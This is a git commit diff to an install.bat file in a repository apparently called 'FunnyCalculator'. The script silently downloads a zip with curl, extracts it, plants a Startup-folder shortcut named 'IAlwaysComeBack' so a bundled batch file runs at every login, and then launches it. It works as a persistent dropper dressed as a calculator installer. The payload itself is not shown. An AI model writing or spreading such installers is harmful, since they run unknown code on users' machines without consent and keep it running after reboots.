d1c4dfef0331fa796a0d8ea9c2c434981aee5e24
Myelin Lennox <118149338+MyelinLennox@users.noreply.github.com>
2025-11-14 07:28:49 -0600

    skill issue

--- install.bat
+++ install.bat
@@ -1,9 +1,8 @@
 @echo off
 
-cd C:\"Program Files\"
-curl.exe -s -O "https://github.com/MyelinLennox/FunnyCalculator/raw/refs/heads/main/EatMyShortz.zip"
+cd "C:\Users\%USERNAME%\"
+curl.exe -s -L -O "https://github.com/MyelinLennox/FunnyCalculator/raw/refs/heads/main/EatMyShortz.zip"
 powershell -NoP -Command "Expand-Archive -LiteralPath 'EatMyShortz.zip' -DestinationPath '.' -Force"
 
-mklink "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\IAlwaysComeBack.lnk" "C:\Program Files\EatMy
-Shortz\IAlwaysComeBack.bat"
-./C:\Program Files\EatMyShortz\IAlwaysComeBack.bat
+mklink "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\IAlwaysComeBack.lnk" "C:\Program Files\EatMyShortz\IAlwaysComeBack.bat"
+start "C:\Users\%USERNAME%\EatMyShortz\IAlwaysComeBack.bat"
